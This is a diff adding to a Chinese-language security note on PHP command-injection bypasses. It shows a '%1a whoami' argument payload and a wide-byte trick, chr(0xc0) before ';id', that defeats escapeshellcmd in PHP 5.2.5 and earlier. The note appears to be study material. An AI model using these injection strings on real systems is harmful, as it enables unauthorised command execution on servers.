@@ -14,6 +14,17 @@ payload:
 ```
 dir=../ %1a whoami
 ```
+## 情景二：宽字节注入
+php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。
+```
+escapeshellcmd("echo ".chr(0xc0).";id"); 
+```
+之后该语句会变成
+```
+echo 繺;id 
+```
+从而实现 id 命令的注入。
+
 
 # Refference
 + [PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
